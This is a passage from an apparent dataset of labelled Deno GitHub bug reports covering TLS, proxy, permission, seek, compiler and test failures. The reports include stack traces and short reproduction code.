this just to demonstrate how random it is.\r\n\r\n**[Additional]**\r\nI have wiped out my DENO_DIR, but it didn't do anything, the error was still being thrown.\r\n\r\nI didn't want to open this issue until being sure it was a real issue/bug. As per my conversation with @lucacasonato where I share these same details, we agreed on the weirdness of this. \r\n\r\n**[Stacktrace]**\r\n```\r\n Error: Another accept task is ongoing\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:42:11)\r\n    at Object.sendAsync ($deno$/ops/dispatch_json.ts:93:10)\r\n    at async ListenerImpl.accept ($deno$/net.ts:63:17)\r\n    at async Server.acceptConnAndIterateHttpRequests (server.ts:212:14)\r\n    at async MuxAsyncIterator.callIteratorNext (mux_async_iterator.ts:30:31)\r\n```\r\n\r\n**[Code details]**\r\nThis is happening in [Mandarine Framework](https://github.com/mandarineorg/mandarinets). You can find the failing code in the branch [`make-everything-a-proxy`](https://github.com/mandarineorg/mandarinets/tree/feature/make-everything-a-proxy).\r\n1) Download the mentioned branch (make-everything-a-proxy)\r\n2) Go to the root of it in your computer\r\n3) Run `deno run --config tsconfig.json --allow-net --allow-read examples/example-1.ts`\r\n\r\n`OrmCoreDecoratorsProxy` which is the class that is making the HTTP dispatcher fail **at this time**, is being called in **`/orm-core/core/decorators/entityDecorator.ts`** Line 16. (Inside _decorator method_ \"Table\")\r\n\r\n`OrmCoreDecoratorsProxy` is located in **`/orm-core/proxys/ormCoreDecorators.ts`**\r\n\r\n**I would like to mention** that the decorator `Table` where the problem is happening as described before is not even being called in the file that's being ran (`examples/example-1.ts`), so the code is never processing `OrmCoreDecoratorsProxy`, the very very simple fact of putting it in the code is making the HTTP dispatcher fail somehow.\r\n\r\n**[OS]**\r\nMacOS Mojave 10.14.6\r\n\r\n**[Environment]**\r\ndeno 1.1.2\r\nv8 8.5.216\r\ntypescript 3.9.2\r\n\r\n**Update** After testing with many _versions of Deno_, this started happening in version **1.0.3** as it is not happening in **1.0.2**\r\n\r\n---- \r\n\r\ncc @lucacasonato \r\n\r\n[screen-capture (3).webm.zip](https://github.com/denoland/deno/files/4866989/screen-capture.3.webm.zip)\r\n"},{"labels":["bug",null],"text":"It seems like after using Deno.setRaw, even after setting it to false, and then doing the same thing in a subprocess, deno panics. I created an example script here: https://gist.github.com/Yamboy1/c9cb9e215d3a3433193044d96a62f62a.\r\n\r\n```\r\n$ deno run --unstable -A https://gist.githubusercontent.com/Yamboy1/c9cb9e215d3a3433193044d96a62f62a/raw/46680c56316343ee1206fcee7168242d23eb346b/test.ts\r\n```"},{"labels":["bug",null],"text":"Versions: deno 1.1.0, 1.1.2\r\n\r\nI have a client connecting to a hosted TLS server (it's a hosted postgres instance but that shouldn't matter).  A self signed CA certificate is used to validate the server's cert chain.  I can connect to the public net interface of the server fine.  However, the connection fails talking to the same server over a private network connection.\r\n\r\n```\r\nWARN RS - rustls::session:718 - Sending fatal alert DecodeError\r\nerror: Uncaught InvalidData: invalid certificate: BadDER\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:42:11)\r\n    at Object.sendAsync ($deno$/ops/dispatch_json.ts:93:10)\r\n    at async Object.startTls ($deno$/tls.ts:70:15)\r\n    at async startTlsPostgres (connection.ts:357:20)\r\n    at async connectPg (connection.ts:93:24)\r\n    at async testDb (index.ts:9:14)\r\n    at async index.ts:24:1\r\n```\r\n\r\n* The server cert is the same whether I connect through the public or private network interface\r\n* The CA cert being used is the same\r\n* The server hostname is different between the two cases\r\n  * public hostname: db-xxx-yyy.provider.com\r\n  * private hostname: private-db-xxx-yyy.provider.com\r\n* The SAN of the server cert contains entries for both the public and private hostnames\r\n  * `X509v3 Subject Alternative Name: DNS:db-xxx-yyy.provider.com, DNS:private-db-xxx-yyy.provider.com`\r\n\r\nAgain, everything works fine when I connect to the server over the internet.  So I believe the certs are fine.  What I would like to see is more detailed error messages to help me diagnose what is wrong in this case.\r\n\r\nAn option to disable server cert verification (while still connecting via TLS) would also be very helpful!\r\n"},{"labels":["bug"],"text":"[This project](https://github.com/i18next/i18next-http-backend) is not written in TypeScript and has no tsconfig.json file.\r\n\r\nRunning tests with deno v1.x.x works: https://github.com/i18next/i18next-http-backend/runs/780086740?check_suite_focus=true\r\n![image](https://user-images.githubusercontent.com/1086194/86243674-12595b80-bba7-11ea-8df9-52490eb87ddb.png)\r\n\r\n\r\nRunning tests with deno v1.1.x fails: https://github.com/i18next/i18next-http-backend/runs/826465216?check_suite_focus=true\r\n![image](https://user-images.githubusercontent.com/1086194/86243697-1b4a2d00-bba7-11ea-8ea3-5e74d0cc80c2.png)\r\n\r\nAny help is welcome. 🙏 "},{"labels":["bug",null],"text":"It should use test_util::new_deno_dir() to construct an ephemeral one.\r\n\r\nThis also applies to test_bundle and maybe other tests in tsc.rs.\r\n"},{"labels":["bug",null],"text":"I don't know if it is related but since today the fullpath is missing in the stacktrace in my github [CI](https://github.com/apiel/adka/runs/814693690?check_suite_focus=true):\r\n\r\n![image](https://user-images.githubusercontent.com/5873198/85932819-dafd5d00-b8cf-11ea-86bf-88614babb38f.png)\r\n\r\n_Originally posted by @apiel in https://github.com/denoland/deno/issues/5202#issuecomment-650634379_\r\n\r\nMost likely introduced in #6428 with the change to use inline source maps."},{"labels":["bug",null],"text":"Network permissions check for a URL without an explicit port number doesn't account for default ports of well-known schemes (80 for HTTP, 443 for HTTPS), resulting in a false negative in case permissions were indeed granted for that host:port combo explicitly.\r\n\r\n### Steps to reproduce\r\n\r\n1. Grant permissions to access www.google.com:443 (to ensure only secure access).\r\n2. Try to access an https url without specifying the 443 port, i.e. fetch from https://www.google.com/robots.txt\r\n3. Deno denies access to that address, even though the operation itself is indeed targeting the allowed port on the allowed address.\r\n4. Try to fetch https://www.google.com:443/robots.txt\r\n5. Deno denies access here as well\r\n\r\n### Example\r\nConsider the following test:\r\n```ts\r\nconst res = await fetch('https://www.google.com/robots.txt');\r\nconst data = await res.text();\r\nconsole.log(data);\r\n```\r\nCalling `deno run --allow-net=www.google.com:443 test.ts` fails on permissions.\r\n\r\nEven if we explicitly try to fetch from  https://www.google.com:443/robots.txt we fail on permissions.\r\n\r\n### Cause \r\nThe Rust url crate kindly discards the port number if it is the default of the scheme:\r\n```rust\r\nuse url::*;\r\n\r\nfn main() {\r\n    let uri = url::Url::parse(\"https://www.google.com:443\").unwrap();\r\n    println!(\"URI = {:?}\", uri);  // prints https://www.google.com\r\n    println!(\"port = {:?}\", uri.port()); // prints None\r\n}\r\n```\r\nPrints the URL without the port number, port is None.\r\nTo get the port number, we need to use `port_or_known_default()`:\r\n```rust\r\nprintln!(\"Seriously, port {:?}\", uri.port_or_known_default()); // prints 443\r\n```"},{"labels":["bug",null,null],"text":"When following the basic HTTP fetch example behind an HTTP proxy *with authentication* I am getting a permission denied error from my proxy because the username and password for the proxy server are not being read from the `HTTP_PROXY` environment variables:\r\n\r\n    deno run -A fetch.ts http://katharostech.com\r\n\r\n**fetch.ts:**\r\n```ts\r\nconst url = Deno.args[0];\r\nconst res = await fetch(url);\r\n\r\nconst body = new Uint8Array(await res.arrayBuffer());\r\nawait Deno.stdout.write(body);\r\n```\r\n\r\nThe output is a the HTML for the 403 page of my proxy server.\r\n\r\nInterestingly if I just query an HTTPS url instead, it works as expected:\r\n\r\n    deno run -A fetch.ts http://katharostech.com\r\n\r\n### Deno Version\r\n\r\n```\r\ndeno 1.1.1\r\nv8 8.5.104\r\ntypescript 3.9.2\r\n```"},{"labels":["bug",null],"text":"Why is Deno not supporting `i64` as seek offset ?\r\n\r\nIt should ! Linux has devices or other big files that can be seek with a big offset.\r\n\r\nHere is the stacktrace when trying to seek a 64bits integer:\r\n\r\n```\r\nerror: Uncaught InvalidData: invalid value: integer `56762287783936`, expected i32\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)\r\n    at [...]\r\n```\r\n\r\nReproduce code:\r\n\r\n```ts\r\n  const file = await Deno.open(\r\n    `/proc/${pid}/mem`,\r\n    { read: true, write: true, truncate: false, create: false },\r\n  );\r\n   const offset: i64 = 56762287783936;\r\n   await file.seek(offset, Deno.SeekMode.Start);\r\n```\r\n"},{"labels":["bug",null],"text":"I'm trying to use `Deno.realPath()` and I get the following error no matter how I enter the path to the directory\r\n`Error: The filename, directory name, or volume label syntax is incorrect.`\r\n\r\nI've tried the following formats to find the directory\r\n`Deno.realPath(\"./api\")`\r\n`Deno.realPath(\"/api\")`\r\n`Deno.realPath(\"\\\\api\")`\r\n`Deno.realPath(\".\\\\api\")`\r\n`Deno.realPath('${Deno.cwd()}/api')`\r\n`Deno.realPath('${Deno.cwd()}\\\\api')`\r\n\r\nOS: Window 10 and Linux (Pop-os)\r\nDeno Version: 1.1.1\r\nTypeScript: 3.9.5\r\nRepo: https://github.com/bfgcoding/xenus"},{"labels":["bug",null],"text":"Following tests are non-deterministic:\r\n- `test_compile`\r\n- `test_bundle` \r\n\r\nThey do not use custom `DENO_DIR` but rather rely on the default value - that means they modify files in default location of `DENO_DIR` on developers machine."},{"labels":["bug",null],"text":"example https://github.com/denoland/deno/runs/806953504\r\n```\r\n2020-06-25T10:48:59.9541990Z failures:\r\n2020-06-25T10:48:59.9542370Z \r\n2020-06-25T10:48:59.9543520Z ---- _015_duplicate_parallel_import stdout ----\r\n2020-06-25T10:48:59.9544010Z target_dir /Users/runner/runners/2.263.0/work/deno/deno/target/release\r\n2020-06-25T10:48:59.9544430Z root path /Users/runner/runners/2.263.0/work/deno/deno/test_util/..\r\n2020-06-25T10:48:59.9545310Z deno_exe path /Users/runner/runners/2.263.0/work/deno/deno/target/release/deno\r\n2020-06-25T10:48:59.9546350Z target_dir /Users/runner/runners/2.263.0/work/deno/deno/target/release\r\n2020-06-25T10:48:59.9547320Z deno_exe args run --quiet --reload --allow-read 015_duplicate_parallel_import.js\r\n2020-06-25T10:48:59.9547830Z deno_exe tests path \"/Users/runner/runners/2.263.0/work/deno/deno/test_util/../cli/tests\"\r\n2020-06-25T10:48:59.9548220Z OUTPUT\r\n2020-06-25T10:48:59.9550030Z error: Uncaught TypeError: EOF while parsing a value at line 1 column 0\r\n2020-06-25T10:48:59.9551390Z error: test failed, to rerun pass '-p deno --test integration_tests'\r\n2020-06-25T10:48:59.9551560Z \r\n2020-06-25T10:48:59.9552250Z OUTPUT\r\n2020-06-25T10:48:59.9561420Z ##[error]thread '_015_duplicate_parallel_import' panicked at 'bad exit code, expected: 0, actual: 1', test_util/src/lib.rs:265:7\r\n2020-06-25T10:48:59.9565100Z stack backtrace:\r\n2020-06-25T10:48:59.9566200Z    0:        0x10b9056ff - <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt::h83d53b696ac99295\r\n2020-06-25T10:48:59.9567050Z    1:        0x10b92ec4e - core::fmt::write::hf81c429634e1f3ed\r\n2020-06-25T10:48:59.9568420Z    2:        0x10b815819 - std::io::Write::write_fmt::h53fe50e3fff0275d\r\n2020-06-25T10:48:59.9569360Z    3:        0x10b8fc68c - std::io::impls::<impl std::io::Write for alloc::boxed::Box<W>>::write_fmt::h352c9db3a02449c0\r\n2020-06-25T10:48:59.9570190Z    4:        0x10b9094da - std::panicking::default_hook::{{closure}}::ha991e4eca34b4afa\r\n2020-06-25T10:48:59.9571000Z    5:        0x10b9091b8 - std::panicking::default_hook::h722aa3f5c1c31788\r\n2020-06-25T10:48:59.9571810Z    6:        0x10b909aa8 - std::panicking::rust_panic_with_hook::h2cd47f71d6d55501\r\n2020-06-25T10:48:59.9572300Z    7:        0x10b909672 - rust_begin_unwind\r\n2020-06-25T10:48:59.9573090Z    8:        0x10b939b2b - std::panicking::begin_panic_fmt::h769fb8929973777e\r\n2020-06-25T10:48:59.9573920Z    9:        0x10b854f91 - test_util::CheckOutputIntegrationTest::run::h4e23869c72d8a4fe\r\n2020-06-25T10:48:59.9574760Z   10:        0x10b785bfb - core::ops::function::FnOnce::call_once::h7311f1ce8926695a\r\n2020-06-25T10:48:59.9575580Z   11:        0x10b83aaf3 - test::run_test::run_test_inner::{{closure}}::hf35455f67ec1e4ed\r\n2020-06-25T10:48:59.9576560Z   12:        0x10b814d1b - std::sys_common::backtrace::__rust_begin_short_backtrace::hffd4a983e423c33e\r\n2020-06-25T10:48:59.9577420Z   13:        0x10b81a1f5 - core::ops::function::FnOnce::call_once{{vtable.shim}}::hd45267100ae6c7ce\r\n2020-06-25T10:48:59.9578270Z   14:        0x10b91174d - std::sys::unix::thread::Thread::new::thread_start::h2b28b74d30bce841\r\n2020-06-25T10:48:59.9578780Z   15:     0x7fff6b557109 - _ZL12preoptimized\r\n2020-06-25T10:48:59.9578880Z \r\n2020-06-25T10:48:59.9578960Z \r\n2020-06-25T10:48:59.9579090Z failures:\r\n2020-06-25T10:48:59.9579230Z     _015_duplicate_parallel_import\r\n2020-06-25T10:48:59.9579430Z \r\n2020-06-25T10:48:59.9579600Z test result: FAILED. 216 passed; 1 failed; 12 ignored; 0 measured; 0 filtered out\r\n```"},{"labels":["bug",null],"text":"I'm behind an HTTP proxy with authentication and a custom certificate, but I'm getting an undescribed `HandshakeFailure` when trying to run hello world:\r\n\r\n```\r\n$ deno run --cert=/usr/local/share/ca-certificates/proxy-ca.crt  -L debug https://deno.land/std/examples/welcome.ts\r\nDeno isolate init with snapshots.\r\nrust:shared_queue:reset\r\nDEBUG JS - cwd /home/vagrant/git/katharostech-gitea/katharostech-com\r\nDEBUG JS - args []\r\nmain_module https://deno.land/std/examples/welcome.ts\r\nfetch_source_file specifier: https://deno.land/std/examples/welcome.ts maybe_referrer: None\r\n⚠️️  Granted network access to \"https://deno.land/std/examples/welcome.ts\"\r\nDownload https://deno.land/std/examples/welcome.ts\r\nstarting new connection: https://deno.land/\r\nproxy(http://[redacted]:3128) intercepts 'https://deno.land/'\r\nconnecting to [redacted]:3128\r\nconnected to [redacted]:3128\r\ntunnel to deno.land:443 using basic auth\r\nNo cached session for DNSNameRef(\"deno.land\")\r\nNot resuming any session\r\nERROR RS - rustls::session:514 - TLS alert received: Message {\r\n    typ: Alert,\r\n    version: TLSv1_2,\r\n    payload: Alert(\r\n        AlertMessagePayload {\r\n            level: Fatal,\r\n            description: HandshakeFailure,\r\n        },\r\n    ),\r\n}\r\nerror: error sending request for url (https://deno.land/std/examples/welcome.ts): error trying to connect: received fatal alert: HandshakeFailure\r\n```\r\n\r\nI have my `HTTP_PROXY` and `HTTPS_PROXY` environment variables set like so:\r\n\r\n```\r\nhttp_proxy=http://user:password@[redacted]:3128\r\nexport https_proxy=$http_proxy\r\nexport HTTP_PROXY=$http_proxy\r\nexport HTTPS_PROXY=$http_proxy\r\nexport ftp_proxy=$http_proxy\r\nexport FTP_PROXY=$http_proxy\r\n```\r\n\r\nIs there any way to get more info on what is actually failing? This happens with any deno command that tries to access the internet."},{"labels":["bug",null],"text":"When trying to import:\r\n`import {Button, Grid} from 'https://cdn.pika.dev/@material-ui/core@^4.10.2';` \r\n\r\nI get:\r\n\r\n`error: 'implements', 'interface', 'let', 'package', 'private', 'protected',  'public', 'static', or 'yield' cannot be used as an identifier in strict mode at https://cdn.pika.dev/-/csstype@v2.6.10-9lGFwmNeuxj9xXremWKA/dist=es2019,mode=exports/index.d.ts:1:7,Expected Comma, got Some(Word(StandardLonghandProperties)) at https://cdn.pika.dev/-/csstype@v2.6.10-9lGFwmNeuxj9xXremWKA/dist=es2019,mode=exports/index.d.ts:1:17`\r\n\r\nIs this a deno or csstype issue? Thx"},{"labels":["bug",null],"text":"I'm trying to catch the following error:\r\n\r\n```\r\nerror: Uncaught Error: Directory not empty (os error 66)\r\n```\r\n\r\nThere seems to be no good way for me to do this. It's not in the list of errors that are given a special type, so I cannot use `instanceof`.\r\n\r\nhttps://github.com/denoland/deno/blob/fab0204cbf20cc1be7874266325bf258fe0ecaca/cli/js/errors.ts\r\n\r\nOther than that, I can't see a good way to test for the error number or a symbolic error code. I guessed at `e.code` (as in Node.js) but that was not set.\r\n\r\nIs there a way for me to get the error code from non-special-cased errors?"},{"labels":["bug",null,null],"text":"I'm trying to send emails but I'm not able to connect to the server. \r\n\r\nThis is my code:\r\n\r\n```js\r\nDeno.connectTls({\r\n    hostname: 'smtp.mailgun.org',\r\n    port: 587\r\n})\r\n```\r\n\r\nResponse:\r\n\r\n```\r\nerror: Uncaught InvalidData: received corrupt message\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)\r\n    at async Object.connectTls ($deno$/tls.ts:20:15)\r\n```\r\n\r\nDeno version\r\n\r\n```\r\ndeno 1.1.1\r\nv8 8.5.104\r\ntypescript 3.9.2\r\n```"},{"labels":["bug",null],"text":"With a shell script like this:\r\ndeno-hello.ts:\r\n```typescript\r\n#!/usr/bin/env deno run --allow-all --unstable\r\n// do something cool\r\n```\r\nThe program works as expected.\r\n\r\nIf you rename `deno-hello.ts` to `deno-hello` the result of what you get depends on the state of the deno cache. In some cases, the script continues to run without a problem (expected behavior).\r\n\r\nIn some cases, you'll get a weird issue like:\r\n`thread 'main' panicked at 'Cached source file doesn't exist', cli/global_state.rs:188:15`\r\n\r\nOr some bizarre typescript error:\r\n```\r\nUncaught SyntaxError: Unexpected token ':'\r\nnc.addEventListener(\"error\", (err: Error): void => {\r\n```\r\n\r\nWhile `deno install` is the correct strategy for registering a script, the throwback is that in some cases it does work correctly until something else happens. If the lack of extension is the problem, it would be more helpful for deno to require that the file extension of the script be .ts or .js.\r\n\r\n"},{"labels":["bug",null],"text":"For some reason doing a GET on`\r\nhttps://copernicus.discomap.eea.europa.eu/arcgis/rest/services/Corine/CLC2018_WM/MapServer/0?f=json` \r\ncrashes Deno with:\r\n\r\n```\r\nerror: Uncaught Http: error sending request for url (https://copernicus.discomap.eea.europa.eu/arcgis/rest/services/Corine/CLC2018_WM/MapServer/0?f=json): \r\nerror trying to connect: tls handshake eof\r\n```\r\n\r\nWorks fine with curl and client side JS. Something wrong with SSL management in Deno? Calling on HTTP doesn't work either since Deno upgrades to HTTPS.\r\n\r\n### Steps to reproduce\r\n\r\nSource:\r\n```\r\nconst layerInfoURL = 'https://copernicus.discomap.eea.europa.eu/arcgis/rest/services/Corine/CLC2018_WM/MapServer/0?f=json';\r\nconst json = await fetch(layerInfoURL).then(r => r.json());\r\n\r\nconsole.log(json);\r\n```\r\n\r\nor\r\n\r\n```\r\ndeno run --allow-net https://deno.land/x/gh:enjikaka:terrain-server/poor_api.ts\r\n```\r\n\r\n### Version\r\n\r\ndeno 1.1.1\r\nv8 8.5.104\r\ntypescript 3.9.2\r\nmacOS 10.15.5 (19F101)\r\nalso fails in docker on hayd/alpine-deno:1.1.1"},{"labels":["bug",null],"text":"version: `1.1.1`\r\ncmd: `sudo deno run -c tsconfig.json --unstable -A examples/tests/modules/build.ts`\r\ncode:\r\n```ts\r\nconst [, scriptProd] = await Deno.compile(\"index.ts\", {\r\n        \"index.ts\": `import test from '/test.js'`,\r\n        \"test.js\": 'export default 10;',\r\n      }, {\r\n        module: \"esnext\",\r\n        target: \"esnext\",\r\n        resolveJsonModule: false,\r\n        experimentalDecorators: true,\r\n        allowUnreachableCode: false,\r\n        jsx: \"preserve\",\r\n        jsxFactory: \"Ogone.r(\",\r\n        inlineSourceMap: false,\r\n        inlineSources: false,\r\n        alwaysStrict: false,\r\n        sourceMap: false,\r\n        strictFunctionTypes: true,\r\n        lib: [\"dom\", \"esnext\"],\r\n      });\r\n```\r\n\r\nlog:\r\n```log\r\nthread 'main' panicked at 'Can't downcast ErrBox(JSError(JSError { message: \"Uncaught AssertionError: Assertion failed.\", source_line: None, script_resource_name: Some(\"$deno$/util.ts\"), line_number: Some(35), start_column: Some(10), end_column: Some(11), frames: [JSStackFrame { type_name: Some(\"Object\"), function_name: Some(\"assert\"), method_name: Some(\"assert\"), file_name: Some(\"$deno$/util.ts\"), line_number: Some(35), column_number: Some(11), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(11) }, JSStackFrame { type_name: None, function_name: Some(\"buildLocalSourceFileCache\"), method_name: None, file_name: Some(\"$deno$/compiler.ts\"), line_number: Some(551), column_number: Some(7), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(7) }, JSStackFrame { type_name: None, function_name: Some(\"runtimeCompile\"), method_name: None, file_name: Some(\"$deno$/compiler.ts\"), line_number: Some(1335), column_number: Some(3), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(3) }, JSStackFrame { type_name: Some(\"global\"), function_name: Some(\"tsCompilerOnMessage\"), method_name: Some(\"onmessage\"), file_name: Some(\"$deno$/compiler.ts\"), line_number: Some(1505), column_number: Some(22), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(22) }, JSStackFrame { type_name: None, function_name: Some(\"workerMessageRecvCallback\"), method_name: None, file_name: Some(\"$deno$/runtime_worker.ts\"), line_number: Some(72), column_number: Some(33), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(33) }, JSStackFrame { type_name: Some(\"global\"), function_name: None, method_name: None, file_name: Some(\"file:///home/rudy/Documents/Perso/Ogone/__anonymous__\"), line_number: Some(1), column_number: Some(1), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(1) }], formatted_frames: [\"Object.assert ($deno$/util.ts:35:11)\", \"buildLocalSourceFileCache ($deno$/compiler.ts:551:7)\", \"runtimeCompile ($deno$/compiler.ts:1335:3)\", \"tsCompilerOnMessage ($deno$/compiler.ts:1505:22)\", \"workerMessageRecvCallback ($deno$/runtime_worker.ts:72:33)\", \"file:///home/rudy/Documents/Perso/Ogone/__anonymous__:1:1\"] })) to OpError', cli/op_error.rs:422:9\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\n```\r\nstack backtrace:\r\n```log\r\n\r\n   0:     0x55fa63a20f34 - backtrace::backtrace::libunwind::trace::hc1c4a1d8ad423b97\r\n                               at /cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.46/src/backtrace/libunwind.rs:86\r\n   1:     0x55fa63a20f34 - backtrace::backtrace::trace_unsynchronized::h82274781060cb056\r\n                               at /cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.46/src/backtrace/mod.rs:66\r\n   2:     0x55fa63a20f34 - std::sys_common::backtrace::_print_fmt::h2a45d89b653a4da8\r\n                               at src/libstd/sys_common/backtrace.rs:78\r\n   3:     0x55fa63a20f34 - <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt::h41a0a93ab85e6aa1\r\n                               at src/libstd/sys_common/backtrace.rs:59\r\n   4:     0x55fa63a5178c - core::fmt::write::hdaea18585065a96d\r\n                               at src/libcore/fmt/mod.rs:1069\r\n   5:     0x55fa63a17fc3 - std::io::Write::write_fmt::h0cea70c809005252\r\n                               at src/libstd/io/mod.rs:1504\r\n   6:     0x55fa63a23dc5 - std::sys_common::backtrace::_print::hd95f9978cc145ca4\r\n                               at src/libstd/sys_common/backtrace.rs:62\r\n   7:     0x55fa63a23dc5 - std::sys_common::backtrace::print::hfb25ca2291be47d0\r\n                               at src/libstd/sys_common/backtrace.rs:49\r\n   8:     0x55fa63a23dc5 - std::panicking::default_hook::{{closure}}::h44f76cee5dc8591c\r\n                               at src/libstd/panicking.rs:198\r\n   9:     0x55fa63a23b02 - std::panicking::default_hook::h198e1a712910f1e6\r\n                               at src/libstd/panicking.rs:218\r\n  10:     0x55fa63a24422 - std::panicking::rust_panic_with_hook::hc0b4730bb8013f9d\r\n                               at src/libstd/panicking.rs:511\r\n  11:     0x55fa63a2400b - rust_begin_unwind\r\n                               at src/libstd/panicking.rs:419\r\n  12:     0x55fa63a23f7b - std::panicking::begin_panic_fmt::h3693eb684a4f728c\r\n                               at src/libstd/panicking.rs:373\r\n  13:     0x55fa625a30f8 - <deno::op_error::OpError as core::convert::From<deno_core::errors::ErrBox>>::from::{{closure}}::hc13a5b472f433617\r\n  14:     0x55fa625a2f1e - <deno::op_error::OpError as core::convert::From<deno_core::errors::ErrBox>>::from::hda6b4d7c5e8e4f6f\r\n  15:     0x55fa624e00ca - <core::future::from_generator::GenFuture<T> as core::future::future::Future>::poll::hfbb3131637005bf7\r\n  16:     0x55fa624bcee2 - <core::future::from_generator::GenFuture<T> as core::future::future::Future>::poll::h6d0f99e877b0180a\r\n  17:     0x55fa626d032c - <futures_util::future::future::map::Map<Fut,F> as core::future::future::Future>::poll::ha09ffbad1a36a2c4\r\n  18:     0x55fa6269e89f - <futures_util::future::future::flatten::Flatten<Fut,<Fut as core::future::future::Future>::Output> as core::future::future::Future>::poll::he8e455d297c74124\r\n  19:     0x55fa626d92cf - <futures_util::future::future::map::Map<Fut,F> as core::future::future::Future>::poll::hdcbd37db28cdfa9e\r\n  20:     0x55fa62e9bb84 - <futures_util::future::future::map::Map<Fut,F> as core::future::future::Future>::poll::hddb5331b9dea9e64\r\n  21:     0x55fa62e7db59 - <futures_util::future::future::Map<Fut,F> as core::future::future::Future>::poll::hf8020d97b7bae34d\r\n  22:     0x55fa62e9ffa1 - futures_util::stream::stream::StreamExt::poll_next_unpin::h885734c4ac44edb6\r\n  23:     0x55fa62e80ab3 - <deno_core::core_isolate::CoreIsolate as core::future::future::Future>::poll::h6970f86c79d53070\r\n  24:     0x55fa62e7a161 - <deno_core::es_isolate::EsIsolate as core::future::future::Future>::poll::h03c37420632a3e55\r\n  25:     0x55fa624d9283 - <core::future::from_generator::GenFuture<T> as core::future::future::Future>::poll::hd6aa575daf844bff\r\n  26:     0x55fa626e1520 - std::thread::local::LocalKey<T>::with::hbae5758cbbb986d7\r\n  27:     0x55fa624abb87 - tokio::macros::scoped_tls::ScopedKey<T>::set::h63f182d019a8aea3\r\n  28:     0x55fa6258cf6d - tokio::runtime::basic_scheduler::BasicScheduler<P>::block_on::hbae780f60b87f7a1\r\n  29:     0x55fa62525d8d - tokio::runtime::context::enter::hf9e40c486f33bdf5\r\n  30:     0x55fa62632654 - deno::tokio_util::run_basic::hfd509858047a7c5f\r\n  31:     0x55fa62569f14 - deno::main::h8160d79eba3150cb\r\n  32:     0x55fa626dfae3 - std::rt::lang_start::{{closure}}::h96e2216cfd68cb58\r\n  33:     0x55fa63a24868 - std::rt::lang_start_internal::{{closure}}::h7a212202ff76034b\r\n                               at src/libstd/rt.rs:52\r\n  34:     0x55fa63a24868 - std::panicking::try::do_call::h6d214a73427d759b\r\n                               at src/libstd/panicking.rs:331\r\n  35:     0x55fa63a24868 - std::panicking::try::hc078f0e11721d1cb\r\n                               at src/libstd/panicking.rs:274\r\n  36:     0x55fa63a24868 - std::panic::catch_unwind::hb31c05be30625612\r\n                               at src/libstd/panic.rs:394\r\n  37:     0x55fa63a24868 - std::rt::lang_start_internal::hcf7fb98a775d5af0\r\n                               at src/libstd/rt.rs:51\r\n  38:     0x55fa6256b122 - main\r\n  39:     0x7ff474951b97 - __libc_start_main\r\n  40:     0x55fa62295279 - _start\r\n  41:                0x0 - <unknown>\r\n```\r\nissue is not reproduced when erasing any import statement"},{"labels":["bug"],"text":"I was trying to leave an inline comment about how to workaround [this issue](https://github.com/denoland/deno/issues/6338) with \"deno bundle\" and @deno-types, like this\r\n\r\n```ts\r\n// @deno-types=\"https://raw.githubusercontent.com/DefinitelyTyped/DefinitelyTyped/deab75bde42b5a82aeb951f5a2edaa09922853f4/types/cheerio/index.d.ts\" //Needs to be temporarily removed when bundling until https://github.com/denoland/deno/issues/6338 is fixed\r\n```\r\n\r\nBut I ran into this error \r\n\r\n```cmd\r\nerror: Import 'https://raw.githubusercontent.com/DefinitelyTyped/DefinitelyTyped/deab75bde42b5a82aeb951f5a2edaa09922853f4/types/cheerio/index.d.ts%22%20/Needs%20to%20be%20temporarily%20removed%20when%20bundling%20until%20https:/github.com/denoland/deno/issues/6338%20is%20fixed' failed: 404 Not Found\r\n```\r\n\r\nI think the issue is that [swc_util.rs](https://github.com/denoland/deno/blob/db70b77e4b6a24814e0045f7f6afcf77730878a7/cli/swc_util.rs)::get_deno_types is currently assuming that nothing will come after the closing quotation mark for the path to the d.ts\r\n\r\n![image](https://user-images.githubusercontent.com/29322882/85243822-7beba400-b408-11ea-8397-3dc051903ed4.png)\r\n\r\nThe workaround of putting the comment on its own line above the @deno-types directive is very straightforward though.\r\n"},{"labels":["bug",null,null],"text":"When executing `deno run` on stdin disabled environment, deno panics as following.\r\n\r\n```\r\n2020-06-20T07:11:34.862 [Information] Starting worker process:D:\\home\\site\\wwwroot\\bin\\windows\\deno.exe  run --allow-net --allow-env --allow-read \"D:\\home\\site\\wwwroot\\worker.bundle.js\"\r\n2020-06-20T07:11:35.218 [Information] D:\\home\\site\\wwwroot\\bin\\windows\\deno.exe process with Id=16464 started\r\n2020-06-20T07:11:35.484 [Information] thread 'main' panicked at 'called `Result::unwrap()` on an `Err` value: Os { code: 6, kind: Other, message: \"The handle is invalid.\" }', cli\\ops\\io.rs:86:17\r\n2020-06-20T07:11:35.485 [Information] stack backtrace:\r\n2020-06-20T07:11:35.551 [Information] 0:     0x7ff7554d176f - CrashForExceptionInNonABICompliantCodeRange\r\n2020-06-20T07:11:35.551 [Information] 1:     0x7ff7554f31bb - CrashForExceptionInNonABICompliantCodeRange\r\n2020-06-20T07:11:35.551 [Information] 2:     0x7ff7554c732c - CrashForExceptionInNonABICompliantCodeRange\r\n2020-06-20T07:11:35.551 [Information] 3:     0x7ff7554d4ccc - 